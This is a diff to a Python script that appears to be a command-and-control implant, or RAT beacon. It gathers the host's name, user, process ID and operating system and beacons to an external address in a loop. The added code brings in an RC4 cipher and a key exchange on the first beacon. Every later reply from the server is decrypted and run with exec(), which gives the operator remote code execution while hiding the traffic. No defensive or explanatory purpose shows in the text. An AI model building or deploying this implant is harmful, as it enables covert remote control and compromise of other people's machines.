@@ -12,6 +12,24 @@ beacon_url = protocol + "://" + external_address + "/" + beacon_uri
 update_url = protocol + "://" + external_address + "/" + update_uri
 
 
+def crypt(data, key):
+    S = range(256); j = 0; out = []
+
+    for i in range(256):
+        j = (j + S[i] + ord(key[i % len(key)])) % 256
+        S[i] , S[j] = S[j] , S[i]
+
+    i = j = 0
+
+    for char in data:
+        i = ( i + 1 ) % 256
+        j = ( j + S[i] ) % 256
+        S[i] , S[j] = S[j] , S[i]
+        out.append(chr(ord(char) ^ S[(S[i] + S[j]) % 256]))
+
+    return "".join(out)
+
+
 def get_system_info():
     hostname = socket.gethostname()
     current_user = getpass.getuser()
@@ -42,7 +60,26 @@ def beacon(hostname, current_user, process_id, operating_system):
 
 
 if __name__ == "__main__":
+    counter = 0
+
     while True:
         hostname, current_user, process_id, operating_system = get_system_info()
-        exec(beacon(hostname, current_user, process_id, operating_system))
+
+        # If initial beacon
+        if counter is 0:
+            print "new host"
+
+            # Gets encryption key
+            key = beacon(hostname, current_user, process_id, operating_system)
+            counter += 1
+
+        # Else recurring beacon
+        else:
+            print "old host"
+            #print beacon(hostname, current_user, process_id, operating_system)
+            exec(crypt(beacon(hostname, current_user, process_id, operating_system), key))
+
+            # statement above will need changed to exec()
+            #print k
+
         time.sleep(sleep_interval)
